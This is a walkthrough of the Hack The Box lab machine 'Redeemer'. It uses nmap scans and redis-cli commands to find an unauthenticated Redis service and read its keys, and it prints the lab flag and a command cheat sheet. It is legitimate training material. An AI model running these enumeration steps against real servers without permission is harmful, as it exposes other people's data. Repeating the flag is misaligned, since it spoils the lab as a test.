# Hack The Box - Redeemer

## Machine Information

| Item | Value |
|------|-------|
| Machine | Redeemer |
| Difficulty | Very Easy |
| Operating System | Linux |
| Target IP | 10.129.170.144 |

---

# Objective

- Enumerate the target.
- Identify the exposed service.
- Connect to the service.
- Enumerate available data.
- Retrieve the flag.

---

# Methodology

```
Reconnaissance
      │
      ▼
Port Scanning
      │
      ▼
Service Enumeration
      │
      ▼
Authentication Check
      │
      ▼
Data Enumeration
      │
      ▼
Retrieve Flag
```

---

# 1. Initial Enumeration

## Initial Scan

Command

```bash
nmap -Pn -sV 10.129.170.144 | tee nmap.txt
```

Result

```text
All 1000 scanned ports closed.
```

### Analysis

The target was alive, but the default scan of the top 1000 TCP ports did not reveal any services.

Instead of stopping, perform a full TCP port scan.

---

# 2. Full Port Scan

Command

```bash
nmap -T4 -Pn -p- --min-rate 1000 10.129.170.144 | tee nmap-allports.txt
```

Result

```text
PORT     STATE SERVICE
6379/tcp open  redis
```

### Finding

- Port **6379** is open.
- Service: **Redis**

---

# 3. Understanding Redis

Redis (**Remote Dictionary Server**) is an in-memory NoSQL database.

Unlike relational databases (MySQL/PostgreSQL), Redis stores information as **key-value pairs**.

SQL

```
Database
 └── Table
      └── Row
           └── Column
```

Redis

```
Database
 └── Key
      └── Value
```

Example

```
username
    │
    ▼
Spectre

flag
    │
    ▼
03e1d2b376c37ab3f5319922053953eb
```

Redis is commonly used for:

- Cache
- User sessions
- Authentication tokens
- Queues
- Leaderboards
- Rate limiting

---

# 4. Testing Connectivity

Verify Redis is responding.

Command

```bash
redis-cli -h 10.129.170.144 PING
```

Result

```text
PONG
```

### Analysis

The Redis server is reachable and accepts commands.

---

# 5. Database Enumeration

## Check Database Size

Command

```bash
redis-cli -h 10.129.170.144 DBSIZE
```

Output

```text
(integer) 4
```

There are **4 keys** stored in the database.

---

## Check Authentication

Command

```bash
redis-cli -h 10.129.170.144 CONFIG GET requirepass
```

Output

```text
1) "requirepass"
2) ""
```

### Analysis

The empty string means **no password is configured**.

---

## List Available Keys

Command

```bash
redis-cli -h 10.129.170.144 KEYS "*"
```

Output

```text
1) "numb"
2) "flag"
3) "temp"
4) "stor"
```

Interesting key discovered:

```
flag
```

---

# 6. Retrieve the Flag

Retrieve the value stored inside the `flag` key.

Command

```bash
redis-cli -h 10.129.170.144 GET flag
```

Output

```text
"03e1d2b376c37ab3f5319922053953eb"
```

Flag

```text
03e1d2b376c37ab3f5319922053953eb
```

---

# Redis Commands Learned

## Test Connection

```bash
redis-cli -h TARGET PING
```

---

## Server Information

```bash
redis-cli -h TARGET INFO server
```

---

## Database Size

```bash
redis-cli -h TARGET DBSIZE
```

---

## Authentication Configuration

```bash
redis-cli -h TARGET CONFIG GET requirepass
```

---

## List Keys

```bash
redis-cli -h TARGET KEYS "*"
```

---

## Read a Value

```bash
redis-cli -h TARGET GET <key>
```

Example

```bash
redis-cli -h TARGET GET flag
```

---

# Key Concepts Learned

## Redis is a Database

Redis is **not just memory**.

It is a **NoSQL database** that stores its primary dataset in RAM for extremely fast access.

---

## Key-Value Storage

Instead of tables and rows, Redis stores data as:

```
Key
 │
 ▼
Value
```

Example

```
flag
 │
 ▼
03e1d2b376c37ab3f5319922053953eb
```

---

## Why Redis is Fast

Traditional databases read from disk.

```
Application
      │
      ▼
MySQL
      │
      ▼
Disk
```

Redis keeps frequently accessed data in memory.

```
Application
      │
      ▼
Redis
      │
      ▼
RAM
```

This makes Redis ideal for caching and session management.

---

# Enumeration Workflow

```
Target
   │
   ▼
Nmap Scan
   │
   ▼
Redis Detected
   │
   ▼
redis-cli
   │
   ▼
PING
   │
   ▼
DBSIZE
   │
   ▼
CONFIG GET requirepass
   │
   ▼
KEYS "*"
   │
   ▼
GET flag
```

---

# Lessons Learned

- Default Nmap scans only the top 1000 ports.
- A full TCP scan (`-p-`) may reveal hidden services.
- Redis commonly runs on port **6379**.
- Redis stores data using the **key-value** model.
- `PING` verifies connectivity.
- `DBSIZE` shows the number of keys.
- `CONFIG GET requirepass` checks whether authentication is enabled.
- `KEYS "*"` enumerates available keys.
- `GET <key>` retrieves the value associated with a key.

---

# Machine Summary

| Category | Result |
|----------|--------|
| Target | 10.129.170.144 |
| Service | Redis |
| Port | 6379 |
| Authentication | Disabled |
| Keys Found | 4 |
| Flag Retrieved | ✅ |
| Machine Status | Completed |